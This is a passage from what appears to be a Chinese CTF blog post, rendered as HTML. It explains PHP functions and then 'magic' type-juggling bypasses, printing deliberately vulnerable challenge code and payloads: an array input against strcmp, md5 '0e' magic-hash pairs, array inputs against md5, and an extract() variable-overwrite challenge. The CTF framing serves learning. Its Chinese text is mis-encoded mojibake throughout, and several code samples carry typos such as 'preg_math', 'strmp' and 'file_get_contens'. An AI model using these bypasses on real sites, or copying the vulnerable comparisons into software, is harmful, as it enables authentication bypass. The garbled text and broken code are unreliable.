class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>,EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º<br>$a = Original; $b = Dog; $c = Horse; $dup_a = Cat<br></code></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3><p><strong>isset()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULLã€‚è‹¥ä½¿ç”¨ isset() æµ‹è¯•ä¸€ä¸ªè¢«è®¾ç½®æˆ NULL çš„å˜é‡ï¼Œå°†è¿”å› FALSEã€‚</p><h4 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><code>bool isset ( mixed $var [, mixed $... ] )</code></p><blockquote><p>$varä¸ºè¦æµ‹è¯•çš„å˜é‡</p></blockquote><p>å¦‚æœä¸€æ¬¡ä¼ å…¥å¤šä¸ªå‚æ•°ï¼Œé‚£ä¹ˆ isset() åªæœ‰åœ¨å…¨éƒ¨å‚æ•°éƒ½è¢«è®¾ç½®æ—¶è¿”å› TRUEï¼Œè®¡ç®—è¿‡ç¨‹ä»å·¦è‡³å³ï¼Œä¸­é€”é‡åˆ°æ²¡æœ‰è®¾ç½®çš„å˜é‡æ—¶å°±ä¼šç«‹å³åœæ­¢ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤ºï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å˜é‡å·²è®¾ç½®&quot;</span><br>&#125;<br><span class="hljs-comment">//ç»“æœä¸ºtrueï¼Œå°†æ‰“å°æ–‡æœ¬</span><br><br><span class="hljs-comment">//ä½¿ç”¨var_dumpè¾“å‡ºisset()çš„è¿”å›å€¼ã€‚</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;Mod&quot;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;Modifier&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//åˆ é™¤å˜é‡a</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-variable">$c</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º<br>å˜é‡å·²è®¾ç½®<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(true)<br>bool(flase)<br></code></pre></td></tr></table></figure><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contens</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#è¾“å‡ºæ¼”ç¤º</span><br>This <span class="hljs-keyword">is</span> an example <span class="hljs-keyword">for</span> test<br>(è¾“å‡ºæ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡æœ¬)<br></code></pre></td></tr></table></figure><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><p><code>strcmp()</code>æŠŠä¸¤ä¸ªå­—ç¬¦ä¸²ä»¥äºŒè¿›åˆ¶æ–¹å¼è¿›è¡Œæ¯”è¾ƒï¼Œä¸”è¯¥å‡½æ•°æ¯”è¾ƒæ—¶åŒºåˆ†å¤§å°å†™ã€‚</p><h4 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><code>strcmp(string1, string2)</code></p><h4 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>å¦‚æœè¿”å›å€¼å°äº0ï¼Œåˆ™str1å°äºstr2;</p><p>å¦‚æœè¿”å›å€¼å¤§äº0ï¼Œåˆ™str1å¤§äºstr2;</p><p>å¦‚æœè¿”å›å€¼ç­‰äº0ï¼Œåˆ™str1ç­‰äºstr2;</p><blockquote><p>æœ‰èµ„æ–™è¯´è¿”å›å€¼ä¹Ÿä¸ä»…æ˜¯-1å’Œ1ï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶ä»–æ•°æ®</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤ºï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strmp</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">//è¾“å‡º0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">//è¾“å‡º1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿˜æœ‰ä¸ªå‡½æ•°strcasecmp()ï¼Œç”¨æ³•ä¸strcmp()ç±»ä¼¼ï¼Œåªæ˜¯ä¸åŒºåˆ†å¤§å°å†™</p></blockquote><h3 id="ereg-x2F-preg-match"><a href="#ereg-x2F-preg-match" class="headerlink" title="ereg&#x2F;preg_match"></a>ereg&#x2F;preg_match</h3><p><code>ereg()</code>å’Œ<code>preg_match()</code>æ˜¯PHPä¸­å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p><strong>ç´§æ€¥è¡¥è¯¾â€”æ­£åˆ™è¡¨è¾¾å¼</strong></p><p>åœ¨ç¼–å†™å¤„ç†å­—ç¬¦ä¸²çš„ç¨‹åºæˆ–è€…ç½‘é¡µçš„æ—¶å€™ï¼Œç»å¸¸ä¼šæŸ¥æ‰¾ç¬¦åˆæŸäº›å¤æ‚è§„åˆ™çš„å­—ç¬¦ä¸²çš„éœ€è¦ï¼Œæ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯ç”¨äºæè¿°è¿™äº›è§„åˆ™çš„è¯­æ³•ã€‚</p><p>ä½œç”¨ï¼š åˆ†å‰²ï¼Œ åŒ¹é…ï¼Œ æŸ¥æ‰¾ï¼Œ æ›¿æ¢</p><p>ä¾‹å¦‚ï¼š éªŒè¯é‚®ç®±åœ°å€æ ¼å¼ï¼Œ æ‰‹æœºå·ç æ ¼å¼ç­‰ç­‰</p><h4 id="è¯­æ³•-3"><a href="#è¯­æ³•-3" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><code>preg_match(mode, string subject, array matches);</code></p><p><code>ereg(mode,string,subject,array regs);</code></p><p>mode : æ­£åˆ™è¡¨è¾¾å¼</p><p>subject : éœ€è¦éªŒè¯çš„å­—ç¬¦ä¸²</p><p>matches&#x2F;regs : åŒ¹é…åå¾—åˆ°çš„ç»“æœï¼Œä»¥æ•°ç»„çš„æ–¹å¼å­˜å‚¨</p><h4 id="è¿”å›å€¼-1"><a href="#è¿”å›å€¼-1" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>è¿”å›å€¼æ˜¯<strong>false</strong>æˆ–<strong>true</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º1ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//æ¨¡å¼åˆ†éš”ç¬¦åçš„iæ ‡è®°è¿™æ˜¯ä¸€ä¸ªå¤§å°å†™ä¸æ•æ„Ÿçš„æœç´¢</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²&quot;</span>ï¼›<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æœªå‘ç°åŒ¹é…å­—ç¬¦ä¸²&quot;</span>ï¼›<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º1ï¼š<br>æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º2ï¼š</span><br><span class="hljs-comment">//æŸ¥æ‰¾å›ºå®šçš„æŸä¸ªå•è¯</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//æ¨¡å¼ä¸­çš„ \b æ ‡è®°ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œæ‰€ä»¥åªæœ‰ç‹¬ç«‹çš„å•è¯ä¼šè¢«åŒ¹é…ï¼Œè€Œä¸ä¼šåŒ¹é…å•è¯çš„éƒ¨åˆ†å†…å®¹ </span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æœªå‘ç°åŒ¹é…å­—ç¬¦ä¸²\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is harder than others!&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æœªå‘ç°åŒ¹é…å­—ç¬¦ä¸²\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º2ï¼š<br>æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²<br>æœªå‘ç°åŒ¹é…å­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º3ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// ä»URLä¸­è·å–ä¸»æœºåç§°</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<br>    <span class="hljs-string">&quot;http://shmodifier.github.io&quot;</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<br> <br><span class="hljs-comment">// è·å–ä¸»æœºåç§°çš„åé¢ä¸¤éƒ¨åˆ†</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;domain name is: <span class="hljs-subst">&#123;$matches[0]&#125;</span>\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º3ï¼š<br>domain name is: github.io<br></code></pre></td></tr></table></figure><p><del>ä¹±ä¸ƒå…«ç³Ÿä¸€å †ç¬¦å·æˆ‘ä¸€ä¸ªéƒ½çœ‹ä¸æ‡‚æˆ‘å¥½å¾—å¾ˆå“‡</del></p><h2 id="é­”æ³•éƒ¨åˆ†"><a href="#é­”æ³•éƒ¨åˆ†" class="headerlink" title="é­”æ³•éƒ¨åˆ†"></a>é­”æ³•éƒ¨åˆ†</h2><p>è­¦å‘Šï¼šéº»ç“œè¯·è‡ªè§‰é€€å‡ºğŸš«</p><h3 id="01-strcmpç»•è¿‡"><a href="#01-strcmpç»•è¿‡" class="headerlink" title="01 strcmpç»•è¿‡"></a>01 strcmpç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midiferç»ˆå°†å¦ææ³°æ¥&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], FLAG) == <span class="hljs-number">0</span>) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç›¸ä¿¡æˆ‘:&quot;</span> . FLAG;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>psï¼šä»wsé‚£é‡Œcopyæ¥çš„ï¼ˆx</p><h4 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>æ¡ä»¶æ˜¯<code>strcmp($_GET[&#39;flag&#39;], FLAG) == 0</code>ï¼Œå°±æ˜¯è¦**$_GET<strong>å˜é‡å’Œ</strong>FLAG**ç›¸ç­‰ï¼Œä½†æ˜¯æˆ‘ä»¬é™¤äº†ä¸¥åˆ‘é€¼ä¾›å‡ºé¢˜äººï¼Œæ ¹æœ¬å°±ä¸çŸ¥é“FLAGæ˜¯ä»€ä¹ˆã€‚</p><blockquote><p>$_GET[â€˜flagâ€™]æ„æ€æ˜¯ä»urlè·å–ä¸€ä¸ªå«flagçš„GETå‚æ•°</p></blockquote><p>ä¸è¦å®³æ€•ï¼</p><p><strong>å½“ strcmp() æ¯”è¾ƒå‡ºé”™æ—¶ä¼šè¿”å› NULLï¼›è€Œè¿”å› NULL å³ä¸ºè¿”å› 0</strong>ï¼Œæˆ‘ä»¬åªéœ€è¦palyloadä¸€ä¸ªéå­—ç¬¦ä¸²å˜é‡å’Œå­—ç¬¦ä¸²FLAGæ¯”è¾ƒå°±ä¼šå‡ºé”™å¹¶è¿”å›0ã€‚</p><p>æ¬¸ï¼Œç›¸ç­‰è¾£ï¼</p><p><strong>æœ€ç»ˆpalyload</strong>ï¼š <code>?flag[]=0</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-02-28_21-02-17.png"></p><h3 id="02-md5ç»•è¿‡"><a href="#02-md5ç»•è¿‡" class="headerlink" title="02 md5ç»•è¿‡"></a>02 md5ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midiferç»ˆå°†å¦ææ³°æ¥&#x27;</span>);<br> <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>]) &#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç›¸ä¿¡æˆ‘ :&quot;</span> . FLAG;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>æ¡ä»¶æ˜¯<code>($_GET[&#39;s1&#39;])!=$-GET[&#39;s2&#39;] &amp;&amp; md5($GET[s1])==$_get[&#39;s2&#39;]</code>ï¼Œå°±æ˜¯å˜é‡s1å’Œs2<strong>ä¸èƒ½ç›¸ç­‰</strong>ä½†æ˜¯ä»–ä»¬çš„<strong>md5è¦ç›¸ç­‰</strong>ã€‚</p><p>å› ä¸ºs2å’Œs2ä¸èƒ½ç›¸ç­‰ï¼Œæ‰€ä»¥å•çº¯md5åŠ å¯†å¾—å‡ºçš„å¯†æ–‡ä¸€å®šä¹Ÿä¸å®Œå…¨ä¸€æ ·ï¼Œè¿™æ—¶å°±è¦åˆ©ç”¨ä¸€äº›æ­ªé—¨é‚ªé“<del>ï¼ˆä¸æ˜¯ï¼‰</del>ã€‚</p><p><strong>ç´§æ€¥è¡¥è¯¾â€”md5</strong></p><p>md5ä¸€ç§å¯†ç æ•£åˆ—å‡½æ•°ã€‚MD5ç®—æ³•çš„åŸç†å¯ç®€è¦çš„å™è¿°ä¸ºï¼šMD5ç ä»¥512ä½åˆ†ç»„æ¥å¤„ç†è¾“å…¥çš„ä¿¡æ¯ï¼Œä¸”æ¯ä¸€åˆ†ç»„åˆè¢«åˆ’åˆ†ä¸º16ä¸ª32ä½å­åˆ†ç»„ï¼Œç»è¿‡äº†ä¸€ç³»åˆ—çš„å¤„ç†åï¼Œç®—æ³•çš„è¾“å‡ºç”±å››ä¸ª32ä½åˆ†ç»„ç»„æˆï¼Œå°†è¿™å››ä¸ª32ä½åˆ†ç»„çº§è”åå°†ç”Ÿæˆä¸€ä¸ª128ä½æ•£åˆ—å€¼ã€‚</p><p><del>è¡¥ä¸äº†æˆ‘çœ‹ä¸æ‡‚</del>ğŸ¥²</p><h5 id="001-ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡"><a href="#001-ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡" class="headerlink" title="001 ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡"></a>001 ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</h5><p>å­—ç¬¦ä¸²ç»è¿‡md5åŠ å¯†åï¼Œä¼šç”Ÿæˆæ—¢æœ‰æ•°å­—åˆæœ‰å­—æ¯çš„å¯†æ–‡ï¼Œå¯ä»¥åˆ©ç”¨<strong>ç§‘å­¦è®¡æ•°æ³•</strong>çš„è¯­æ³•è§„å¾‹åæ¨æ˜æ–‡ã€‚</p><blockquote><p>äº†è§£åˆ°md5æ˜¯ä¸å¯é€†çš„æ‰€ä»¥åº”è¯¥ä¸èƒ½è§£ç ï¼Œä½†æ˜¯å¯ä»¥æ ¹æ®åŠ å¯†è§„å¾‹æ‰¾æ»¡è¶³éœ€è¦çš„æ˜æ–‡</p></blockquote><p>0æ— è®ºä¹˜åçš„å‡ æ¬¡æ–¹éƒ½ä»ç„¶ä¸ºé›¶ï¼Œä¾‹å¦‚<code>&#39;0e123456&#39;==&#39;0e654321&#39;==0</code>ã€‚æ‰€ä»¥åªéœ€è¦æ‰¾åˆ°ä¸¤ä¸ªç»è¿‡md5åŠ å¯†åä»¥<strong>â€0eâ€œ</strong>å¼€å¤´çš„å­—ç¬¦ä¸²å……å½“å˜é‡å³å¯ã€‚</p><p>copyäº†ä¸€äº›åŠ å¯†åæ˜¯0eå¼€å¤´çš„å€¼ï¼š</p><ul><li>QNKCDZO       </li><li>240610708 </li><li>s878926199a      </li><li>s155964671a         </li><li>s214587387a        </li><li>s214587387a        </li><li>0e215962017</li></ul><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?s1=QNKCDZO&amp;s2=240610708</code> </p><p>æ²¡æœ‰æˆåŠŸæˆªå›¾ğŸ˜£</p><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè‡ªå·±è¿è¡Œçš„æ—¶å€™æ²¡æˆåŠŸï¼Œé¡µé¢ä¸€ç‰‡ç©ºç™½ä»€ä¹ˆéƒ½æ²¡è¾“å‡ºã€‚</p><p><strong>ç´§æ€¥è¡¥è¯¾</strong></p><p>åœ¨phpä¸­ï¼Œ**â€™<em>x</em>e<em>y</em>â€˜** æ„ä¸ºxä¹˜10çš„yæ¬¡æ–¹ã€‚ä¾‹å¦‚ï¼š1000 &#x3D;&#x3D; â€˜1e3â€™ã€‚</p><h5 id="002-æ•°ç»„ç»•è¿‡"><a href="#002-æ•°ç»„ç»•è¿‡" class="headerlink" title="002 æ•°ç»„ç»•è¿‡"></a>002 æ•°ç»„ç»•è¿‡</h5><p>å†²æµªå†²åˆ°çš„</p><p>phpä¸­çš„md5å‡½æ•°ä¸èƒ½ç”¨æ¥åŠ å¯†æ•°ç»„ï¼Œæ‰€ä»¥ä¼šå‡ºç°ç»“æœNULLã€‚ä¾‹å¦‚<code>md5([1,2]) == md5([3,4]) == NULL</code>ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?s1[]=1&amp;s2[]=2</code></p><p>ä½†æ˜¯åœ¨æˆ‘çš„ç”µè„‘ä¸Šå¤ç°ä¼šæŠ¥é”™è€Œä¸æ˜¯ç›´æ¥nullç»•è¿‡ã€‚</p><h3 id="03-extract-å˜é‡è¦†ç›–ç»•è¿‡"><a href="#03-extract-å˜é‡è¦†ç›–ç»•è¿‡" class="headerlink" title="03 extract å˜é‡è¦†ç›–ç»•è¿‡"></a>03 extract å˜é‡è¦†ç›–ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>; <br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))<br> &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)<br>    &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Modifierç»ˆå°†å¦ææ³°æ¥&#x27;</span>; <br>    &#125;<br>   <span class="hljs-keyword">else</span><br>   &#123; <br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>   &#125; <br> &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-2"><a href="#è§£é¢˜æ€è·¯-2" class="headerlink" 